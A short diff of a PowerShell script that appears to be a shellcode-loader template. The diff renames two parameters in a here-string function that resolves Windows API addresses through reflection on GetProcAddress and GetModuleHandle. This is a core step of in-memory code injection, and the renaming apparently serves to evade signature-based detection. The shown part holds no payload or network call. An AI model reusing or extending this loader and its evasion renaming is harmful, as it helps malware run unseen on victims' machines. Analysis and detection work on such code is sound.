@@ -2,10 +2,10 @@ Set-StrictMode -Version 2
 
 $VAR1 = @'
 function VAR2 {
-        Param ($VAR_module, $VAR_procedure)
+        Param ($VAR14, $VAR15)
         $VAR3 = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
 
-        return $VAR3.GetMethod('GetProcAddress').Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($VAR3.GetMethod('GetModuleHandle')).Invoke($null, @($VAR_module)))), $VAR_procedure))
+        return $VAR3.GetMethod('GetProcAddress').Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($VAR3.GetMethod('GetModuleHandle')).Invoke($null, @($VAR14)))), $VAR15))
 }
 
 function VAR4 {
